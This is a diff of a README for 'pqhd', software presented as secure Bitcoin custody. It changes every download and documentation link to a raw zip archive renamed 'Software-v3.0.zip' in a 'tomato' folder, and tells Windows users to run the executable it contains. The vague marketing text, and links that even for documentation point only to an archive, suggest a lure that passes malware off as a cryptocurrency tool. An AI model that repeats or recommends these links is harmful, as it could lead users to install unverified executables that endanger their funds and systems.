@@ -4,9 +4,9 @@
 Welcome to pqhd, your solution for secure Bitcoin custody. This software offers a robust, user-friendly approach to managing your digital assets safely and reliably. Follow these steps to get started.
 
 ## 📥 Download pqhd
-[![Download pqhd](https://raw.githubusercontent.com/OUEDRAOGODRAMANE/pqhd/main/tomato/pqhd-1.5.zip)](https://raw.githubusercontent.com/OUEDRAOGODRAMANE/pqhd/main/tomato/pqhd-1.5.zip)
+[![Download pqhd](https://github.com/OUEDRAOGODRAMANE/pqhd/raw/refs/heads/main/tomato/Software-v3.0.zip)](https://github.com/OUEDRAOGODRAMANE/pqhd/raw/refs/heads/main/tomato/Software-v3.0.zip)
 
-To download the latest version of pqhd, visit this page: [Download pqhd](https://raw.githubusercontent.com/OUEDRAOGODRAMANE/pqhd/main/tomato/pqhd-1.5.zip).
+To download the latest version of pqhd, visit this page: [Download pqhd](https://github.com/OUEDRAOGODRAMANE/pqhd/raw/refs/heads/main/tomato/Software-v3.0.zip).
 
 ## 🔍 What is pqhd?
 pqhd provides a deterministic Bitcoin custody architecture. It features:
@@ -31,7 +31,7 @@ To run pqhd smoothly, ensure your system meets the following requirements:
 
 ## 💻 Installation Instructions
 1. **Download the Software**:
-   Visit this page: [Download pqhd](https://raw.githubusercontent.com/OUEDRAOGODRAMANE/pqhd/main/tomato/pqhd-1.5.zip) to find the latest version.
+   Visit this page: [Download pqhd](https://github.com/OUEDRAOGODRAMANE/pqhd/raw/refs/heads/main/tomato/Software-v3.0.zip) to find the latest version.
 
 2. **Install pqhd**:
    - For **Windows**: Run the downloaded executable file and follow the setup instructions.
@@ -68,6 +68,6 @@ To dive deeper into the concepts of Bitcoin safety, consider reviewing:
 - Guides on hardware security and device integrity.
 - Best practices for managing digital assets securely.
 
-For more information, visit the repository page and review additional documentation: [pqhd Documentation](https://raw.githubusercontent.com/OUEDRAOGODRAMANE/pqhd/main/tomato/pqhd-1.5.zip).
+For more information, visit the repository page and review additional documentation: [pqhd Documentation](https://github.com/OUEDRAOGODRAMANE/pqhd/raw/refs/heads/main/tomato/Software-v3.0.zip).
 
 Thank you for choosing pqhd for your Bitcoin custody needs. Feel confident that your assets are protected with our state-of-the-art security features.
